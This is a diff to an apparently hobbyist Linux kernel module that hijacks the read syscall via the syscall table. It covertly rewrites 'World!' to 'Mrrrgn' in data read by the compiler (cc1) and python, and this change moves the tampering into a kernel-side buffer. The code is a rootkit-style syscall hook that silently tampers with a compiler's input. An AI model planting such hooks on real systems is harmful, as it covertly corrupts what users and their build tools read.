@@ -3,6 +3,8 @@
 #include <linux/syscalls.h> // The syscall table and __NR_<syscall_name> helpers
 #include <asm/paravirt.h> // read_cr0, write_cr0
 #include <linux/sched.h> // current task_struct
+#include <linux/slab.h> // kmalloc
+#include <asm/uaccess.h> // copy_from_user, copy_to_user
 
 /* The sys_call_table is const but we can point our own variable at
  * its memory location to get around that.
@@ -41,22 +43,36 @@ asmlinkage long new_sys_read(unsigned int fd, char __user *buf, size_t count)
          */
         if (strcmp(current->comm, "cc1") == 0 ||
             strcmp(current->comm, "python") == 0) {
+            
             long i;
+            
+            /* It's not good to deal directly with userspace memory; we should
+             * copy the buffer to kernel memory, write to it, then copy it 
+             * back to userspace
+             */
+            char *kernel_buf;
+            kernel_buf = kmalloc(count, GFP_KERNEL);
+            if (!kernel_buf)
+                return ret; /* an error; but lets not bug the user, heh */
+            copy_from_user(kernel_buf, buf, count);
+            
             for (i = 0; i < (ret - 6); i++) {
-                if (buf[i] == 'W' &&
-                    buf[i+1] == 'o' &&
-                    buf[i+2] == 'r' &&
-                    buf[i+3] == 'l' &&
-                    buf[i+4] == 'd' &&
-                    buf[i+5] == '!') {
-                    buf[i] = 'M';
-                    buf[i+1] = 'r';
-                    buf[i+2] = 'r';
-                    buf[i+3] = 'r';
-                    buf[i+4] = 'g';
-                    buf[i+5] = 'n';
+                if (kernel_buf[i] == 'W' &&
+                    kernel_buf[i+1] == 'o' &&
+                    kernel_buf[i+2] == 'r' &&
+                    kernel_buf[i+3] == 'l' &&
+                    kernel_buf[i+4] == 'd' &&
+                    kernel_buf[i+5] == '!') {
+                    kernel_buf[i] = 'M';
+                    kernel_buf[i+1] = 'r';
+                    kernel_buf[i+2] = 'r';
+                    kernel_buf[i+3] = 'r';
+                    kernel_buf[i+4] = 'g';
+                    kernel_buf[i+5] = 'n';
                 }
             }
+            copy_to_user(buf, kernel_buf, count);
+            kfree(kernel_buf);
         }
     }
     return ret;
